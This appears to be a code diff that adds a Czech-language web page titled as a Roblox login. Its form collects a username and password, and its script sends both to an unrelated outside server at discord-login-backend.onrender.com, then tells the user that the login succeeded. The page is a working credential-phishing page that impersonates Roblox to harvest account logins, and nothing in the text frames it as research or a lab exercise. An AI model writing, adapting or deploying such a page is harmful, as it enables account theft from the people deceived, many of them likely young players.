@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="cs">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Přihlášení Roblox</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e7e7e7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      width: 300px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background-color: #e2231a;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #c51c13;
+    }
+    #message {
+      margin-top: 10px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Přihlášení Roblox</h2>
+    <form id="loginForm">
+      <input type="text" id="username" placeholder="Uživatelské jméno" required />
+      <input type="password" id="password" placeholder="Heslo" required />
+      <button type="submit">Přihlásit</button>
+      <p id="message"></p>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const message = document.getElementById("message");
+
+      try {
+        const res = await fetch("https://discord-login-backend.onrender.com/login", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ username, password }),
+        });
+
+        if (res.ok) {
+          message.textContent = "✅ Přihlášení úspěšné!";
+          message.style.color = "green";
+        } else {
+          message.textContent = "❌ Chyba při přihlášení.";
+          message.style.color = "red";
+        }
+      } catch (err) {
+        message.textContent = "⚠️ Server nedostupný.";
+        message.style.color = "orange";
+      }
+    });
+  </script>
+</body>
+</html>
